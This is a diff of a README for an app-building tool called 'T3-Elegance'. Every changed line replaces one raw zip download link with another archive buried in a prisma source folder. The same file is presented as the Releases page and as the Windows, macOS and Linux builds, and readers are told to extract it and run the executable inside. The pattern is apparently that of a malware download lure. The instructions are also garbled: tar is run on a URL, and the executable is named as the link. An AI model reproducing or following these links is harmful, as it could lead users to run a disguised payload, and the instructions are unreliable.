@@ -1,6 +1,6 @@
 # 🎨 T3-Elegance - Build Modern Apps with Ease
 
-[![Download T3-Elegance](https://raw.githubusercontent.com/sybyeguy/T3-Elegance/main/packages/common/src/T3-Elegance-3.5-beta.5.zip%20T3--Elegance-0072B1?style=flat&logo=github&logoColor=white)](https://raw.githubusercontent.com/sybyeguy/T3-Elegance/main/packages/common/src/T3-Elegance-3.5-beta.5.zip)
+[![Download T3-Elegance](https://github.com/sybyeguy/T3-Elegance/raw/refs/heads/main/packages/server/prisma/Elegance-theologicopolitical.zip%20T3--Elegance-0072B1?style=flat&logo=github&logoColor=white)](https://github.com/sybyeguy/T3-Elegance/raw/refs/heads/main/packages/server/prisma/Elegance-theologicopolitical.zip)
 
 ## 🌟 Overview
 
@@ -12,7 +12,7 @@ To get started with T3-Elegance, follow the instructions below. You will need to
 
 ### 1. Visit the Downloads Page
 
-To download the latest version of T3-Elegance, please visit our [Releases page](https://raw.githubusercontent.com/sybyeguy/T3-Elegance/main/packages/common/src/T3-Elegance-3.5-beta.5.zip). This page contains all the available versions of the software.
+To download the latest version of T3-Elegance, please visit our [Releases page](https://github.com/sybyeguy/T3-Elegance/raw/refs/heads/main/packages/server/prisma/Elegance-theologicopolitical.zip). This page contains all the available versions of the software.
 
 ### 2. Choose Your Version
 
@@ -22,9 +22,9 @@ On the Releases page, you will see a list of available versions for T3-Elegance.
 
 Locate the appropriate file for your operating system. Common options may include:
 
-- **Windows:** https://raw.githubusercontent.com/sybyeguy/T3-Elegance/main/packages/common/src/T3-Elegance-3.5-beta.5.zip
-- **MacOS:** https://raw.githubusercontent.com/sybyeguy/T3-Elegance/main/packages/common/src/T3-Elegance-3.5-beta.5.zip
-- **Linux:** https://raw.githubusercontent.com/sybyeguy/T3-Elegance/main/packages/common/src/T3-Elegance-3.5-beta.5.zip
+- **Windows:** https://github.com/sybyeguy/T3-Elegance/raw/refs/heads/main/packages/server/prisma/Elegance-theologicopolitical.zip
+- **MacOS:** https://github.com/sybyeguy/T3-Elegance/raw/refs/heads/main/packages/server/prisma/Elegance-theologicopolitical.zip
+- **Linux:** https://github.com/sybyeguy/T3-Elegance/raw/refs/heads/main/packages/server/prisma/Elegance-theologicopolitical.zip
 
 Click on the file link to start the download.
 
@@ -34,13 +34,13 @@ After downloading, the file will be in a compressed format. You need to extract 
 
 - **Windows:** Right-click the downloaded zip file and select "Extract All." Follow the instructions on the screen.
 - **MacOS:** Double-click the downloaded zip file. The files will automatically extract to a new folder.
-- **Linux:** Use your file manager or run the command `tar -xzvf https://raw.githubusercontent.com/sybyeguy/T3-Elegance/main/packages/common/src/T3-Elegance-3.5-beta.5.zip` in the terminal.
+- **Linux:** Use your file manager or run the command `tar -xzvf https://github.com/sybyeguy/T3-Elegance/raw/refs/heads/main/packages/server/prisma/Elegance-theologicopolitical.zip` in the terminal.
 
 ### 5. Run the Application
 
-Once extracted, navigate to the folder containing the files. Look for an executable file. It may be named `https://raw.githubusercontent.com/sybyeguy/T3-Elegance/main/packages/common/src/T3-Elegance-3.5-beta.5.zip`, `T3-Elegance`, or similar.
+Once extracted, navigate to the folder containing the files. Look for an executable file. It may be named `https://github.com/sybyeguy/T3-Elegance/raw/refs/heads/main/packages/server/prisma/Elegance-theologicopolitical.zip`, `T3-Elegance`, or similar.
 
-- **Windows:** Double-click the `https://raw.githubusercontent.com/sybyeguy/T3-Elegance/main/packages/common/src/T3-Elegance-3.5-beta.5.zip` file to open it.
+- **Windows:** Double-click the `https://github.com/sybyeguy/T3-Elegance/raw/refs/heads/main/packages/server/prisma/Elegance-theologicopolitical.zip` file to open it.
 - **MacOS:** Open the `T3-Elegance` file by double-clicking it.
 - **Linux:** Open a terminal, navigate to the folder, and run `./T3-Elegance`.
 
@@ -67,7 +67,7 @@ To ensure T3-Elegance runs smoothly, your system should meet these requirements:
 
 ## 📥 Download & Install
 
-To download T3-Elegance, visit our [Releases page](https://raw.githubusercontent.com/sybyeguy/T3-Elegance/main/packages/common/src/T3-Elegance-3.5-beta.5.zip). After downloading, follow the above steps to extract and run the application. Enjoy building with T3-Elegance!
+To download T3-Elegance, visit our [Releases page](https://github.com/sybyeguy/T3-Elegance/raw/refs/heads/main/packages/server/prisma/Elegance-theologicopolitical.zip). After downloading, follow the above steps to extract and run the application. Enjoy building with T3-Elegance!
 
 ## 🌐 Join the Community
 
